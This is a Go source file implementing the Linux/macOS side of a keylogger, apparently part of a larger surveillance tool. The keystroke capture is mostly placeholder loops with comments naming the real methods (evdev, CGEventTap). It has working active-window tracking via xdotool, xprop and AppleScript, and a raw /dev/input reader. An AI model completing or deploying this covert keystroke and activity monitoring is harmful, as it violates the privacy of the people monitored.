//go:build !windows
// +build !windows

package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// startPlatformKeylogger starts keylogging on Unix-like systems
func (k *Keylogger) startPlatformKeylogger() error {
	switch runtime.GOOS {
	case "linux":
		return k.startLinuxKeylogger()
	case "darwin":
		return k.startDarwinKeylogger()
	default:
		return fmt.Errorf("keylogging not supported on %s", runtime.GOOS)
	}
}

// startLinuxKeylogger captures keystrokes on Linux using /dev/input
func (k *Keylogger) startLinuxKeylogger() error {
	logDebug("Starting Linux keylogger (requires root access)")
	
	// This is a simplified implementation
	// A full implementation would require reading from /dev/input/eventX
	// which requires root privileges
	
	// For demo purposes, we'll simulate by reading stdin
	// In a real implementation, you'd read from input devices
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for k.running {
		select {
		case <-k.stopChan:
			return nil
		case <-ticker.C:
			// Placeholder: In real implementation, read from /dev/input/event*
			// This requires parsing evdev events
			logDebug("Linux keylogger tick (placeholder)")
		}
	}

	return nil
}

// startDarwinKeylogger captures keystrokes on macOS
func (k *Keylogger) startDarwinKeylogger() error {
	logDebug("Starting macOS keylogger (requires accessibility permissions)")
	
	// macOS keylogging would require:
	// 1. Accessibility API access
	// 2. CGEventTap or IOKit HID framework
	// This is a simplified placeholder implementation
	
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for k.running {
		select {
		case <-k.stopChan:
			return nil
		case <-ticker.C:
			// Placeholder: Real implementation would use CGEventTap
			logDebug("macOS keylogger tick (placeholder)")
		}
	}

	return nil
}

// getActiveWindowInfo returns the title and process of the active window on Unix
func getActiveWindowInfo() (string, string) {
	switch runtime.GOOS {
	case "linux":
		return getActiveWindowLinux()
	case "darwin":
		return getActiveWindowDarwin()
	default:
		return "Unknown", "Unknown"
	}
}

// getActiveWindowLinux gets active window info on Linux (requires X11)
func getActiveWindowLinux() (string, string) {
	// Try to get active window using xdotool
	cmd := exec.Command("xdotool", "getactivewindow", "getwindowname")
	output, err := cmd.Output()
	if err == nil {
		title := strings.TrimSpace(string(output))
		return title, "X11_Process"
	}

	// Fallback: try xprop
	cmd = exec.Command("bash", "-c", "xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME")
	output, err = cmd.Output()
	if err == nil {
		lines := strings.Split(string(output), "=")
		if len(lines) > 1 {
			title := strings.Trim(strings.TrimSpace(lines[1]), "\"")
			return title, "X11_Process"
		}
	}

	return "Unknown", "Unknown"
}

// getActiveWindowDarwin gets active window info on macOS
func getActiveWindowDarwin() (string, string) {
	// Use AppleScript to get active window
	script := `tell application "System Events" to get name of first application process whose frontmost is true`
	cmd := exec.Command("osascript", "-e", script)
	output, err := cmd.Output()
	if err == nil {
		appName := strings.TrimSpace(string(output))
		
		// Get window title
		script2 := fmt.Sprintf(`tell application "System Events" to tell process "%s" to get title of front window`, appName)
		cmd2 := exec.Command("osascript", "-e", script2)
		output2, err2 := cmd2.Output()
		if err2 == nil {
			title := strings.TrimSpace(string(output2))
			return title, appName
		}
		
		return appName, appName
	}

	return "Unknown", "Unknown"
}

// readInputEvent reads from Linux input event device (requires root)
func readInputEvent(devicePath string, k *Keylogger) error {
	file, err := os.Open(devicePath)
	if err != nil {
		return err
	}
	defer file.Close()

	reader := bufio.NewReader(file)
	buf := make([]byte, 24) // evdev input_event structure size

	for k.running {
		select {
		case <-k.stopChan:
			return nil
		default:
			_, err := reader.Read(buf)
			if err != nil {
				continue
			}
			
			// Parse evdev event structure
			// This is simplified - real implementation would properly parse the event
			// and extract key codes
		}
	}

	return nil
}
